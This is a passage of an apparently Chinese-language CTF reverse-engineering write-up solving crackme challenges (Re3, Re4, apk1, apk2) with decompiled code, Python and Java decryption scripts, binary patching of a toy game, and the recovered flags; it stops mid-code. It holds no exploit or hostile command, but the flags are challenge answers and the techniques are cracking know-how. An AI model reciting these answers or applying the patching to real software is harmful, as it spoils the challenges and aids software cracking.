&quot;&quot;.join(c)</div></pre></td></tr></table></figure></p><p>flag: It_is_upx_and_map_you_kn0w!!</p><h2 id="Re3"><a href="#Re3" class="headerlink" title="Re3"></a>Re3</h2><p>有ida打开，发现tls,脱去TLS可以参考<a href="https://esebanana.github.io/2017/10/10/re_tls/" target="_blank" rel="external">https://esebanana.github.io/2017/10/10/re_tls/</a><br>发现第一个加密用户名函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_412530</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> k; <span class="comment">// [esp+D0h] [ebp-54h]</span></div><div class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+DCh] [ebp-48h]</span></div><div class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-3Ch]</span></div><div class="line">  __int16 v4[<span class="number">14</span>]; <span class="comment">// [esp+F4h] [ebp-30h]</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+118h] [ebp-Ch]</span></div><div class="line"></div><div class="line">  v5 = j_strlen(&amp;Str);</div><div class="line">  v4[<span class="number">0</span>] = <span class="number">96</span>;</div><div class="line">  v4[<span class="number">1</span>] = <span class="number">113</span>;</div><div class="line">  v4[<span class="number">2</span>] = <span class="number">96</span>;</div><div class="line">  v4[<span class="number">3</span>] = <span class="number">111</span>;</div><div class="line">  v4[<span class="number">4</span>] = <span class="number">127</span>;</div><div class="line">  v4[<span class="number">5</span>] = <span class="number">105</span>;</div><div class="line">  v4[<span class="number">6</span>] = <span class="number">75</span>;</div><div class="line">  v4[<span class="number">7</span>] = <span class="number">85</span>;</div><div class="line">  v4[<span class="number">8</span>] = <span class="number">115</span>;</div><div class="line">  v4[<span class="number">9</span>] = <span class="number">122</span>;</div><div class="line">  v4[<span class="number">10</span>] = <span class="number">74</span>;</div><div class="line">  v4[<span class="number">11</span>] = <span class="number">83</span>;</div><div class="line">  v4[<span class="number">12</span>] = <span class="number">64</span>;</div><div class="line">  v4[<span class="number">13</span>] = <span class="number">81</span>;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 / <span class="number">2</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(&amp;Str + i) ^= *(&amp;Str + v5 - <span class="number">1</span> - i);</div><div class="line">    *(&amp;Str + v5 - <span class="number">1</span> - i) ^= *(&amp;Str + i);</div><div class="line">    *(&amp;Str + i) ^= *(&amp;Str + v5 - <span class="number">1</span> - i);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v5; ++j )</div><div class="line">    word_419500[j] = (<span class="keyword">unsigned</span> __int8)(((((j ^ <span class="number">0x76</span>) - <span class="number">18</span>) ^ <span class="number">0x80</span>) + <span class="number">43</span>) ^ *(&amp;Str + j));</div><div class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v5; ++k )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( word_419500[k] != v4[k] )</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>解密代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">def Re3_qimo():</div><div class="line">    c = []</div><div class="line">    key = [<span class="number">96</span>,<span class="number">113</span>,<span class="number">96</span>,<span class="number">111</span>,<span class="number">127</span>,<span class="number">105</span>,<span class="number">75</span>,<span class="number">85</span>,<span class="number">115</span>,<span class="number">122</span>,<span class="number">74</span>,<span class="number">83</span>,<span class="number">64</span>,<span class="number">81</span>]</div><div class="line">    l=len(key)</div><div class="line">    <span class="keyword">for</span> i in range(l):</div><div class="line">        c.append(chr(key[i]^((((i ^ <span class="number">0x76</span>) - <span class="number">18</span>) ^ <span class="number">0x80</span>) + <span class="number">43</span>)%<span class="number">256</span>))</div><div class="line">    c.reverse()</div><div class="line">    print <span class="string">""</span>.join(c)</div></pre></td></tr></table></figure></p><p>输入flag后、判断flag长度35位，<br>加密一、flag异或得到flag1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">int __cdecl sub_411730(int a1, int a2)</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line">  signed int i; // [esp+D0h] [ebp-8h]</div><div class="line"></div><div class="line">  for ( i = 0; i &lt; 35; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2) ^ 0x76;</div><div class="line">    result = i + 1;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>然后将flag1将中间21个字符分为3组，每一组分别加密<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">#第一组</div><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411800</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + <span class="number">7</span>) ^ <span class="number">0xCC</span>;</div><div class="line">    *(_BYTE *)(i + a1) = <span class="number">2</span> * *(_BYTE *)(i + a1) &amp; <span class="number">0xAA</span> | ((*(_BYTE *)(i + a1) &amp; <span class="number">0xAA</span>) &gt;&gt; <span class="number">1</span>);</div><div class="line">    result = i + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line">#第二组</div><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411910</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + <span class="number">14</span>) ^ <span class="number">0xBE</span>;</div><div class="line">    *(_BYTE *)(i + a1) = <span class="number">4</span> * *(_BYTE *)(i + a1) &amp; <span class="number">0xCC</span> | ((*(_BYTE *)(i + a1) &amp; <span class="number">0xCC</span>) &gt;&gt; <span class="number">2</span>);</div><div class="line">    result = i + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line">#第三组</div><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411A30</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + <span class="number">21</span>) ^ <span class="number">0xEF</span>;</div><div class="line">    *(_BYTE *)(i + a1) = <span class="number">16</span> * *(_BYTE *)(i + a1) &amp; <span class="number">0xF0</span> | ((*(_BYTE *)(i + a1) &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>);</div><div class="line">    result = i + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>最后和key1比较<br>key1 = [0x10,0x1a ,0x17 ,0x11 ,0xd,0x22 ,0x1e ,0xe3 ,0xc6 ,0xda ,0xe3 ,0xc6 ,0xda ,0xdd ,0xf6 ,0xee ,0x6d ,0xe4 ,0xad ,0xe7 ,0x6d ,0xdf ,0x6f ,0x7f ,0x9a ,0xde ,0x6c ,0xff ,0x13 ,0x17 ,0x4 ,0x29 ,0x57 ,0x57 ,0xb ]</p><p>解密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">def Re3_qimo():</div><div class="line">    c = []</div><div class="line">    key = [96,113,96,111,127,105,75,85,115,122,74,83,64,81]</div><div class="line">    l=len(key)</div><div class="line">    for i in range(l):</div><div class="line">        c.append(chr(key[i]^((((i ^ 0x76) - 18) ^ 0x80) + 43)%256))</div><div class="line">    c.reverse()</div><div class="line">    print &quot;&quot;.join(c)</div><div class="line"></div><div class="line">    enc_t = [0x10,0x1a ,0x17 ,0x11 ,0xd,0x22 ,0x1e ,0xe3 ,0xc6 ,0xda ,0xe3 ,0xc6 ,0xda ,0xdd ,0xf6 ,0xee ,0x6d ,0xe4 ,0xad ,0xe7 ,0x6d ,0xdf ,0x6f ,0x7f ,0x9a ,0xde ,0x6c ,0xff ,0x13 ,0x17 ,0x4 ,0x29 ,0x57 ,0x57 ,0xb ]</div><div class="line"></div><div class="line">    dec_t = [0]*35</div><div class="line">    #decode1</div><div class="line">    for i in range(7):</div><div class="line">        v1 = (enc_t[i+7] &amp; 0x55) &lt;&lt; 1</div><div class="line">        v2 = (enc_t[i+7] &gt;&gt; 1) &amp; 0x55</div><div class="line">        enc_t[i+7] = v1 | v2</div><div class="line">        enc_t[i+7] = enc_t[i+7] ^ 0xCC</div><div class="line">    #decode2</div><div class="line">    for i in range(7):</div><div class="line">        v1 = (enc_t[i+14] &amp; 0x33) &lt;&lt; 2</div><div class="line">        v2 = (enc_t[i+14] &gt;&gt; 2) &amp; 0x33</div><div class="line">        enc_t[i+14] = v1 | v2</div><div class="line">        enc_t[i+14] = enc_t[i+14] ^ 0xBE</div><div class="line">    #decode3</div><div class="line">    for i in range(7):</div><div class="line">        v1 = (enc_t[i+21] &amp; 0xF) &lt;&lt; 4</div><div class="line">        v2 = (enc_t[i+21] &gt;&gt; 4) &amp; 0xF</div><div class="line">        enc_t[i+21] = v1 | v2</div><div class="line">        enc_t[i+21] = enc_t[i+21] ^ 0xEF</div><div class="line"></div><div class="line">    for i in range(35):</div><div class="line">        dec_t[i] = chr(enc_t[i] ^ 0x76)</div><div class="line"></div><div class="line">    print &quot;&quot;.join(dec_t)</div></pre></td></tr></table></figure></p><h2 id="Re4"><a href="#Re4" class="headerlink" title="Re4"></a>Re4</h2><p>IDA打开找到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">int __thiscall muen_412200(void *this)</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line">  void *v2; // ecx</div><div class="line">  void *v3; // ecx</div><div class="line">  void *v4; // ecx</div><div class="line"></div><div class="line">  LOBYTE(result) = sub_411163(this);</div><div class="line">  dword_4182DC = (char)result;</div><div class="line">  result = (char)result;</div><div class="line">  switch ( (char)result )</div><div class="line">  &#123;</div><div class="line">    case 0:</div><div class="line">      system(&quot;cls&quot;);</div><div class="line">      result = j_muen_412200(v2);</div><div class="line">      break;</div><div class="line">    case 1:</div><div class="line">      j_atk_subkkkkkkkkkkkkkkkkkkkkkk_412010();</div><div class="line">      system(&quot;cls&quot;);</div><div class="line">      result = j_muen_412200(v3);</div><div class="line">      break;</div><div class="line">    case 2:</div><div class="line">      deffffffffffffffffffffff_41111D();</div><div class="line">      system(&quot;cls&quot;);</div><div class="line">      result = j_muen_412200(v4);</div><div class="line">      break;</div><div class="line">    case 3:</div><div class="line">      deah_411113();</div><div class="line">      return result;</div><div class="line">    default:</div><div class="line">      return result;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>找到攻击函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">int sub_412010()</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line"></div><div class="line">  if ( hp &gt; 0 )</div><div class="line">  &#123;</div><div class="line">    hp -= boss_atk;</div><div class="line">    result = boss_hp - atk;</div><div class="line">    boss_hp -= atk;</div><div class="line">  &#125;</div><div class="line">  if ( hp &lt;= 0 )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;you are die!!\n&quot;);</div><div class="line">    exit(0);</div><div class="line">  &#125;</div><div class="line">  if ( boss_hp &lt;= 0 )</div><div class="line">    result = sub_41100F();</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>改为,这样自己不会掉血<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">int subkkkkkkkkkkkkkkkkkkkkkk_412010()</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line"></div><div class="line">  if ( hp &gt; 0 )</div><div class="line">  &#123;</div><div class="line">    result = boss_hp - atk;</div><div class="line">    boss_hp -= atk;</div><div class="line">  &#125;</div><div class="line">  if ( hp &lt;= 0 )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;you are die!!\n&quot;);</div><div class="line">    exit(0);</div><div class="line">  &#125;</div><div class="line">  if ( boss_hp &lt;= 0 )</div><div class="line">    result = next_boss_sub_41100F();</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>然后，慢慢，把每一层都修改，最后一层因为调用自杀函数，这里直接nop掉，最后修改保存，得到flag<br>flag : flag{I_1ike_hard_w0rk_484_RE_and_never_up}</p><h2 id="apk1"><a href="#apk1" class="headerlink" title="apk1"></a>apk1</h2><p>用工具apk_to_java.jar打开，发现是一个re4加密<br>放在java里运行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encode</span><span class="params">(String aInput, String aKey)</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span> i;</div><div class="line">        <span class="keyword">int</span>[] iS = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</div><div class="line">        <span class="keyword">byte</span>[] iK = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">256</span>];</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</div><div class="line">            iS[i] = i;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> i2 = (<span class="keyword">short</span>) <span class="number">0</span>; i2 &lt; (<span class="keyword">short</span>) <span class="number">256</span>; i2 = (<span class="keyword">short</span>) (i2 + <span class="number">1</span>)) &#123;</div><div class="line">            iK[i2] = (<span class="keyword">byte</span>) aKey.charAt(i2 % aKey.length());</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++) &#123;</div><div class="line">            j = ((iS[i] + j) + iK[i]) % <span class="number">256</span>;</div><div class="line">            <span class="keyword">int</span> temp = iS[i];</div><div class="line">            iS[i] = iS[j];</div><div class="line">            iS[j] = temp;</div><div class="line">        &#125;</div><div class="line">        i = <span class="number">0</span>;</div><div class="line">        j = <span class="number">0</span>;</div><div class="line">        <span class="keyword">int</span> temp;</div><div class="line">        <span class="keyword">char</span>[] iInputChar = aInput.toCharArray();</div><div class="line">        <span class="keyword">char</span>[] iOutputChar = <span class="keyword">new</span> <span class="keyword">char</span>[iInputChar.length];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> x = (<span class="keyword">short</span>) <span class="number">0</span>; x &lt; iInputChar.length; x = (<span class="keyword">short</span>) (x + <span class="number">1</span>)) &#123;</div><div class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span>;</div><div class="line">            j = (iS[i] + j) % <span class="number">256</span>;</div><div class="line">            temp = iS[i];</div><div class="line">            iS[i] = iS[j];</div><div class="line">            iS[j] = temp;</div><div class="line">            iOutputChar[x] = (<span class="keyword">char</span>) (iInputChar[x] ^ ((<span class="keyword">char</span>) iS[(iS[i] + (iS[j] % <span class="number">256</span>)) % <span class="number">256</span>]));</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(iOutputChar);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> UnsupportedEncodingException </span>&#123;</div><div class="line">    String key = <span class="string">"PassW0rd"</span>;               </div><div class="line">    <span class="keyword">byte</span>[] ke = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;(<span class="keyword">byte</span>) <span class="number">33</span>, (<span class="keyword">byte</span>) <span class="number">67</span>, (<span class="keyword">byte</span>) <span class="number">80</span>, (<span class="keyword">byte</span>) <span class="number">65</span>, (<span class="keyword">byte</span>) <span class="number">110</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, Byte.MIN_VALUE, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">98</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">79</span>, (<span class="keyword">byte</span>) <span class="number">76</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">127</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">67</span>, (<span class="keyword">byte</span>) <span class="number">39</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">80</span>, (<span class="keyword">byte</span>) <span class="number">90</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">99</span>, (<span class="keyword">byte</span>) <span class="number">108</span>, (<span class="keyword">byte</span>) <span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">78</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">70</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">116</span>, (<span class="keyword">byte</span>) <span class="number">2</span>, (<span class="keyword">byte</span>) <span class="number">126</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">73</span>, (<span class="keyword">byte</span>) <span class="number">13</span>, (<span class="keyword">byte</span>) <span class="number">113</span>, (<span class="keyword">byte</span>) <span class="number">73</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">82</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">114</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">120</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">79</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">67</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">92</span>, (<span class="keyword">byte</span>) <span class="number">7</span>, (<span class="keyword">byte</span>) <span class="number">115</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">121</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">86</span>, (<span class="keyword">byte</span>) <span class="number">19</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">121</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">86</span>, (<span class="keyword">byte</span>) <span class="number">10</span>, (<span class="keyword">byte</span>) <span class="number">44</span>, (<span class="keyword">byte</span>) <span class="number">77</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">76</span>&#125;;</div><div class="line">    String l = <span class="keyword">new</span> String(ke);    </div><div class="line">    System.out.println(encode(l,key));    </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>最后没有想到的是，java的编码问题导致有些人没有解出来，有点难以接受，我用的是utf-8<br>flag : flag{Th1s_is_only_Rc4_you_Should_know_more}</p><h2 id="apk2"><a href="#apk2" class="headerlink" title="apk2"></a>apk2</h2><p>用工具apk_to_java.jar打开，发现是一个简单的文件加密，直接复制出来运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line">   private static byte[] md5(String data) &#123;</div><div class="line">       try &#123;</div><div class="line">           MessageDigest messageDigest = MessageDigest.getInstance(&quot;md5&quot;);</div><div class="line">           messageDigest.update(data.getBytes());</div><div class="line">           return messageDigest.digest();</div><div class="line">       &#125; catch (NoSuchAlgorithmException e) &#123;</div><div class="line">           e.printStackTrace();</div><div class="line">           return new byte[0];</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   private static byte[] encryptData(byte[] data, byte[] key) &#123;</div><div class="line">       byte keyLength = (byte) key.length;</div><div class="line">       byte[] cipherText = new byte[data.length];</div><div class="line">       for (int i = 0; i &lt; data.length; i++) &#123;</div><div class="line">           cipherText[i] = (byte) (data[i] ^ key[i % keyLength]);</div><div class="line">       &#125;</div><div class="line">       return cipherText;</div><div class="line">   &#125;</div><div class="line">   </div><div class="line">   private static String generateRandomFilename(int length) &#123;</div><div class="line">       Random random = new Random();</div><div class="line">       StringBuilder stringBuilder = new StringBuilder(length);</div><div class="line">       for (int i = 0; i &lt; length; i++) &#123;</div><div class="line">           char temp = (char) random.nextInt(62);</div><div class="line">           if (temp &lt; &apos;\u001a&apos;) &#123;</div><div class="line">               temp = (char) (temp + 97);</div><div class="line">           &#125; else if (temp &lt; &apos;4&apos;) &#123;</div><div class="line">               temp = (char) (temp + 65);</div><div class="line">           &#125; else &#123;</div><div class="line">               temp = (char) (temp + 48);</div><div class="line">           &#125;</div><div class="line">           stringBuilder.append(temp);</div><div class="line">       &#125;</div><div class="line">       System.out.println(stringBuilder.toString());</div><div class="line">       return stringBuilder.toString();</div><div class="line">      </div><div class="line">   &#125;</div><div class="line">   private static byte[] readUri(String uri) throws IOException &#123;</div><div class="line">   File file = new File(uri);  </div><div class="line">       @SuppressWarnings(&quot;resource&quot;)</div><div class="line">InputStream inputStream = new FileInputStream(file);</div><div class="line">       ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</div><div class="line">       byte[] buffer = new byte[1024];</div><div class="line">       while (true) &#123;</div><div class="line">           int read = inputStream.read(buffer);</div><div class="line">           if (read == -1) &#123;</div><div class="line">               return byteArrayOutputStream.toByteArray();</div><div class="line">           &#125;</div><div class="line">           byteArrayOutputStream.write(buffer, 0, read);</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   private static void decode(byte[] cipherText) throws IOException &#123;</div><div class="line">   </div><div class="line">   </div><div class="line">   File outputFile = new File(&quot;F:/CTF/timu/期末/RE/apk2/flag1&quot;);</div><div class="line">          try &#123;</div><div class="line">              FileOutputStream fileOutputStream = new FileOutputStream(outputFile);</div><div 